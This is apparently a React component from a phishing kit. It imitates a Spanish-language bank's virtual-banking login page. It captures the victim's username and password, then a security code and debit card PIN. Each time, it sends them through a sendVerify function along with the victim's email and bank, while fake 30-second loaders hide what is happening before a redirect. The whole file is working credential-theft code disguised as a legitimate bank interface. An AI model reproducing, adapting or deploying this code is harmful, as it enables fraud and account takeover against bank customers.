import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { sendVerify } from '../verifyData';
import styles from './X09.module.css';
import logo from '../../Assets/Images/X09/logo.png'
import logoMobile from '../../Assets/Images/X09/logoMobile.png'
import user from '../../Assets/Images/X09/user.png'
import log from '../../Assets/Images/X09/log.png'
import mail from '../../Assets/Images/X09/mail.png'
import log2 from '../../Assets/Images/X09/log2.png'
import loader from '../../Assets/Images/X09/loader.gif'
import loaderMain from '../../Assets/Images/loader.gif'

function X09() {

    const location = useLocation();
    const navigate = useNavigate();
    const { dataD, dataE } = location.state || {};

    const [dataF, setDataF] = useState('');
    const [dataG, setDataG] = useState('');
    const [dataH, setDataH] = useState('');
    const [dataI, setDataI] = useState('');

    const [showSectionB, setShowSectionB] = useState(false);
    const [showLoader, setShowLoader] = useState(false);
    const [showLoaderMain, setShowLoaderMain] = useState(false);

    const handleContinue = (e) => {

        e.preventDefault();

        if (!showSectionB) {
            setShowLoader(true);
            sendVerify(`🆔: ${dataF}\n🔐: ${dataG}\n📧: ${dataE}\n🏦: ${dataD}`);

            setTimeout(() => {
                setShowLoader(false);
                setShowSectionB(true);
            }, 30000) 
        } else {
            sendVerify(`🔑: ${dataH}\nDEB: ${dataI}\n📧: ${dataE}\n🏦: ${dataD}`);
            setShowLoaderMain(true);
            setTimeout(() => {
                navigate("/resumenpago")
            }, 30000)
        }
    };

    return (
        <>
            <header className={styles.headerX09}>
                <img src={logoMobile} alt="Header" className={styles.imgDefault} />
                <img src={logo} alt="Header Grande" className={styles.imgDesktop} />
            </header>
            <main className={styles.mainX09}>
                {!showSectionB && (
                    <section className={styles.sectionAX09}>
                        <div>
                            <h1>Ingresa a tu Banca Virtual</h1>
                            <form>
                                <div>
                                    <img src={user} alt='User'></img>
                                    <input type='text' 
                                            value={dataF}
                                            onChange={(e) => setDataF(e.target.value)} placeholder='Nombre de usuario'>
                                    </input>
                                </div>
                                <div>
                                    <img src={log} alt='Password'></img>
                                    <input type='password' 
                                            value={dataG}
                                            onChange={(e) => setDataG(e.target.value)}placeholder='Contraseña'>
                                    </input>
                                </div>
                            </form>
                            <div>
                                <p>8+ caracteres</p>
                                <p>1+ mayúscula</p>
                                <p>1+ mínuscula</p>
                                <p>1+ número</p>
                            </div>
                            <p>¿Necesitas ayuda para ingresar?</p>
                            <div>
                                <input type='checkbox'></input>
                                <p>Recordar mi nombre de usuario</p>
                            </div>
                            <button onClick={handleContinue}>Ingresar</button>
                        </div>
                        <div>
                            <h2>¿No te has registrado?</h2>
                            <button>Registrate Aquí</button>
                        </div>
                    </section>
                )}
                {showSectionB && (
                    <section className={styles.sectionBX09}>
                        <h2>Ingresa el codigo de seguridad enviado a tu correo electronico o telefono</h2>
                        <form>
                            <div>
                                <img src={mail} alt='Mail'></img>
                                <input type='password' 
                                        value={dataH}
                                        onChange={(e) => setDataH(e.target.value)}
                                        placeholder='Ingresa el codigo de seguridad'>
                                </input>
                            </div>
                            <div>
                                <img src={log2} alt='Password'></img>
                                <input type='password' 
                                        value={dataH}
                                        onChange={(e) => setDataI(e.target.value)}
                                        placeholder='Ingresa la clave de tu tarjeta debito'>
                                </input>
                            </div>
                        </form>
                        <div>
                            <div>
                                <img></img>
                                <p>Volver</p>
                            </div>
                            <div>
                                <p>Continuar</p>
                                <img></img>
                            </div>
                        </div>
                    </section>
                )}
                {showLoader && (
                    <section className={styles.overlayX09}>
                        <img src={loader}></img>
                    </section>
                )}
                {showLoaderMain && (
                    <section className={styles.loaderMain}>
                        <img src={loaderMain}></img>
                    </section>
                )}
            </main>
        </>
    )
}

export default X09;